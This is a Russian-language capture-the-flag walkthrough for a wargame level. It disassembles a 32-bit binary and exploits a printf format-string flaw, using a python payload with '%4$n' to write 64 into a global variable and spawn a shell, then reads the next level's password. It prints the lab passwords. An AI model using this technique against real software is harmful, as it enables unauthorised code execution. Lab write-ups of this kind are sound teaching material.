# su level3
# pass: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

====
Уязвимость: print, (Format String Attack), %n, запись в глобальную переменную
====

# ./level3

**Поведение: ждёт ввод, возвращает эту же строку. Переполнить не получилось.**

# ltrace ./level3 
   __libc_start_main(0x804851a, 1, 0xbffff804, 0x8048530, 0x80485a0 <unfinished ...>
   fgets(12345
   "12345\n", 512, 0xb7fd1ac0)                                              = 0xbffff550
   printf("12345\n"12345
   )                                                              = 6
   +++ exited (status 0) +++

Защищенный fgets, а потом printf, выход

# disas main

Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave  
   0x08048526 <+12>:    ret    
End of assembler dump.

Вызывается v функция, на всякий случай проверяем, есть ли что то ещё:

# i func
< >
0x080484a4  v
0x0804851a  main
< >

# disas v

Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp                  536
   0x080484ad <+9>:     mov    0x8049860,%eax               stdin
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)             512
   0x080484be <+26>:    lea    -0x208(%ebp),%eax            -520
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax            -520
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    0x804988c,%eax               m = 0
   0x080484df <+59>:    cmp    $0x40,%eax                   64
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax               stdout
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax              "Wait what?!\n"
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)               12
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)               12
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)               1
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)            "/bin/sh"
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave  
   0x08048519 <+117>:   ret    
End of assembler dump.

Здесь вызывается fgets с ограничением в 512, далее этот буфер читается printf, после чего происходит сравнение некоторой переменной с числом 64. Если нет - то выход, если да - вывод строки, а дальше запуск system с bin/sh.

Проверяем, что лежит в eax при сравнении

# x/a 0x804988c
0x804988c <m>:  0x0

Некая m со значением 0.

Проверим переменные

# i var
< >
0x0804988c  m

Действительно, существует глобальная переменная m = 0. **Задача - написать в глобальную переменную число 64.**
Попробуем поискать уязвимости в принтф. Первое - не проверяется то, что вводится пользователем. Нет ограничений на спецификаторы - принтф продолжит считывать инфу со стека. Мы можем вызвать любые спецификаторы, например, распечатать области памяти %p, а затем с %n записать в переменную число. 

Format String Attack

Проверяем, на какой позиции оффсет у принтф - туда положим нужную информацию и будем знать адрес, по которому обратимся в дальнейшем

# python -c 'print "AAAA" + " %p" * 6' > /tmp/l3

# cat /tmp/l3 | ./level3
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025

4 позиция через $, 60 символов + 4 адрес

# python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/l3

# cat /tmp/l3 - | ./level3

# cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
